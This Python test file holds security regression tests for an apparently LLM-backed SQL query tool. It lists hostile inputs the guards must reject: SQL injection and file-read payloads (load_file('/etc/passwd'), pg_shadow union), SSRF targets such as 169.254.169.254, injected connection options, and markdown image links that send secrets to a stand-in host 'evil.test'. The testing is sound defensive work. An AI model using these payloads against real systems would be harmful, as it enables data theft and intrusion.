"""Security regression tests: guard bypass attempts, SSRF policy, redaction, sanitising, limits."""
import logging

import pandas as pd
import pytest

from askql.agent.grounding import ungrounded_numbers
from askql.data import UnsafeSQLError, validate_sql
from askql.data.sources import DatabaseSource, check_connection_policy, normalize_url
from askql.security import (SlidingWindowLimiter, install_log_redaction, redact, register_secrets, safe_error,
                            sanitize_markdown)

T = {"orders", "customers"}


@pytest.mark.parametrize("sql", [
    "SELECT query_to_xml('select * from secrets', true, true, '')",
    "SELECT table_to_xml('secrets', true, true, '')",
    "SELECT pg_ls_dir('/')",
    "SELECT lo_get(1)",
    "SELECT dblink('host=x', 'select 1')",
    "SELECT current_setting('server_version')",
    "SELECT nextval('s')",
    "SELECT sleep(100)",
    "SELECT * FROM orders WHERE id = (SELECT pg_sleep(5))",
    "SELECT load_file('/etc/passwd')",
    "SELECT * FROM prod_db.public.orders",            # catalog-qualified
    "SELECT * FROM otherschema.orders",               # other schema, same table name
    "SELECT * FROM orders o JOIN secret.users u ON 1=1",
    "/* hi */ DROP /* x */ TABLE orders",
    "SELECT 1 UNION SELECT * FROM pg_shadow",
    "EXPLAIN ANALYZE DELETE FROM orders",
    "CALL do_something()",
    "SET default_transaction_read_only = off",
    "BEGIN READ WRITE",
    "VACUUM",
])
def test_guard_blocks_bypass_attempts(sql):
    with pytest.raises(UnsafeSQLError):
        validate_sql(sql, "postgres", T, {"public"})


def test_guard_blocks_mysql_specific():
    for sql in ("SELECT * FROM orders INTO OUTFILE '/tmp/x'", "SELECT benchmark(1e9, md5('a'))",
                "SELECT * FROM mysql.user", "SELECT get_lock('a', 10)"):
        with pytest.raises(UnsafeSQLError):
            validate_sql(sql, "mysql", T, {"shop"})


def test_guard_allows_legit_analytics():
    for sql in (
        "SELECT region, COUNT(*) FILTER (WHERE tier='Pro') n FROM customers GROUP BY region HAVING COUNT(*) > 1",
        "SELECT *, ROW_NUMBER() OVER (PARTITION BY region ORDER BY id) FROM customers",
        "SELECT c.* FROM public.customers c LEFT JOIN orders o ON o.customer_id = c.id WHERE o.id IS NULL",
        "SELECT generate_series(1, 5)",
        "SELECT CAST(x AS INT), x::text, COALESCE(a, 0) FROM orders",
    ):
        validate_sql(sql, "postgres", T, {"public"})


# ------------------------------------------------------------- SSRF / URL policy
@pytest.mark.parametrize("url", [
    "postgresql://u:p@127.0.0.1/db", "postgresql://u:p@localhost/db", "postgresql://u:p@10.0.0.5/db",
    "postgresql://u:p@192.168.1.10/db", "postgresql://u:p@172.16.0.1/db", "postgresql://u:p@169.254.169.254/db",
    "postgresql://u:p@100.64.0.1/db", "postgresql://u:p@[::1]/db", "postgresql://u:p@[::ffff:127.0.0.1]/db",
    "postgresql://u:p@0.0.0.0/db", "mysql://u:p@127.0.0.1/db",
])
def test_ssrf_private_targets_blocked_on_public_deployments(url):
    with pytest.raises(PermissionError):
        check_connection_policy(normalize_url(url), allow_local=False)


@pytest.mark.parametrize("url", [
    "postgresql://u:p@example.com/db?host=/var/run/postgresql",
    "postgresql://u:p@example.com/db?sslrootcert=/etc/passwd",
    "mysql://u:p@example.com/db?unix_socket=/var/run/mysqld/mysqld.sock",
    "mysql://u:p@example.com/db?read_default_file=/etc/mysql/my.cnf",
    "mysql://u:p@example.com/db?local_infile=1",
    "sqlite:///etc/passwd", "sqlite://",
])
def test_url_parameter_and_file_escapes_blocked(url):
    with pytest.raises(PermissionError):
        check_connection_policy(normalize_url(url), allow_local=False)


def test_public_ip_is_pinned_and_safe_params_pass(monkeypatch):
    import askql.data.sources as m

    monkeypatch.setattr(m.socket, "getaddrinfo", lambda *a, **k: [(2, 1, 6, "", ("93.184.216.34", 5432))])
    assert check_connection_policy(normalize_url("postgresql://u:p@db.example.com/x?sslmode=require"), False) == "93.184.216.34"


def test_dns_resolving_to_private_ip_is_blocked(monkeypatch):
    import askql.data.sources as m

    monkeypatch.setattr(m.socket, "getaddrinfo", lambda *a, **k: [(2, 1, 6, "", ("10.1.2.3", 5432))])
    with pytest.raises(PermissionError):
        check_connection_policy(normalize_url("postgresql://u:p@evil.example.com/x"), False)


def test_dns_multi_answer_with_one_private_is_blocked(monkeypatch):
    import askql.data.sources as m

    monkeypatch.setattr(m.socket, "getaddrinfo", lambda *a, **k: [(2, 1, 6, "", ("93.184.216.34", 1)), (2, 1, 6, "", ("127.0.0.1", 1))])
    with pytest.raises(PermissionError):
        check_connection_policy(normalize_url("postgresql://u:p@rebind.example.com/x"), False)


def test_schema_name_cannot_inject_connection_options():
    for bad in ("public -c default_transaction_read_only=off", "a;b", "x' OR '1", '"quoted"', ""):
        if bad == "":
            continue
        with pytest.raises(ValueError):
            DatabaseSource("sqlite:///x.db", schema=bad, allow_local=True)


def test_database_default_is_locked_down():
    with pytest.raises(PermissionError):
        DatabaseSource("sqlite:///sample_data/shop.db")  # allow_local defaults to False


def test_table_outside_reflected_schema_is_rejected(db_source):
    with pytest.raises(UnsafeSQLError):
        db_source.run_query("SELECT * FROM sqlite_master", 10, 5)
    with pytest.raises(UnsafeSQLError):
        db_source.run_query("SELECT * FROM temp.orders", 10, 5)
    assert db_source.run_query("SELECT COUNT(*) c FROM main.orders", 10, 5).df.c[0] == 1500


# ------------------------------------------------------------- secrets
def test_redaction_of_keys_urls_and_log_records(caplog):
    register_secrets(["gsk_THISISASECRETKEY123456"])
    install_log_redaction()
    assert "SECRET" not in redact("error with key gsk_THISISASECRETKEY123456 here")
    assert redact("failed postgresql://admin:hunter2@db.host/x") == "failed postgresql://admin:***@db.host/x"
    assert "AIzaSyABCDEFGHIJKLMNOP" not in redact("key=AIzaSyABCDEFGHIJKLMNOPQRS")
    with caplog.at_level(logging.INFO):
        logging.getLogger("x").info("calling with %s", "gsk_THISISASECRETKEY123456")
    assert "THISISASECRET" not in caplog.text


def test_safe_error_strips_credentials():
    e = RuntimeError("could not connect to postgresql://u:pw123@h/db: refused\nsecond line")
    assert safe_error(e) == "could not connect to postgresql://u:***@h/db: refused"
    assert "hunter2" not in safe_error(RuntimeError("bad password hunter2"), ["hunter2"])


def test_settings_repr_does_not_leak_keys():
    from askql.config import Settings

    s = Settings(_env_file=None, groq_api_keys="gsk_abc123456789", gemini_api_key="AIzaXYZ123456", askql_api_key="s3cretvalue",
                 history_db_url="postgresql://u:dbpass@h/x")
    r = repr(s)
    assert not any(x in r for x in ("gsk_abc", "AIzaXYZ", "s3cretvalue", "dbpass"))


# ------------------------------------------------------------- untrusted LLM output
@pytest.mark.parametrize("evil,expect_absent", [
    ("Total is 5 ![x](https://evil.test/?d=SECRET)", "evil.test"),
    ("see [click here](https://evil.test/steal?x=1)", "evil.test"),
    ("![x][r]\n\n[r]: https://evil.test/a.png", "evil.test"),
    ('<img src="https://evil.test/a.png"> hi', "evil.test"),
    ("<script>alert(1)</script>ok", "<script"),
])
def test_markdown_exfiltration_vectors_removed(evil, expect_absent):
    assert expect_absent not in sanitize_markdown(evil)


def test_sanitize_keeps_normal_markdown():
    assert sanitize_markdown("**North** leads with 1,200 (+5%).\n- a\n- b") == "**North** leads with 1,200 (+5%).\n- a\n- b"
    assert sanitize_markdown("see [docs](https://x.test)") == "see docs"


# ------------------------------------------------------------- grounding
DF = pd.DataFrame({"region": ["North", "South"], "revenue": [12345.678, 9000.0], "share": [0.256, 0.5]})


def test_grounded_numbers_pass():
    assert ungrounded_numbers(["North made $12,345.68, South 9,000. That is 2 regions and 25.6% share."], DF, 2) == []
    assert ungrounded_numbers(["Total revenue 21,345.68 over 2 rows"], DF, 2) == []  # sum
    assert ungrounded_numbers(["about 12.3K"], DF, 2) == []
    assert ungrounded_numbers(["top 5 customers in 2024"], DF, 2, question="top 5 customers in 2024") == []


def test_fabricated_numbers_are_flagged():
    bad = ungrounded_numbers(["North made $98,765 which is up 43% year over year"], DF, 2)
    assert "$98,765" in bad and "43%" in bad


# ------------------------------------------------------------- limiter
def test_sliding_window_limiter_blocks_then_recovers(monkeypatch):
    import askql.security as sec

    now = [1000.0]
    monkeypatch.setattr(sec.time, "monotonic", lambda: now[0])
    lim = SlidingWindowLimiter(3, 60)
    assert [lim.hit("a") for _ in range(4)] == [True, True, True, False]
    assert lim.hit("b")  # independent key
    now[0] += 61
    assert lim.hit("a")


def test_limiter_memory_is_bounded():
    lim = SlidingWindowLimiter(5, 0.0)  # everything expires immediately
    for i in range(6000):
        lim.hit(f"k{i}")
    assert len(lim._hits) < 6000
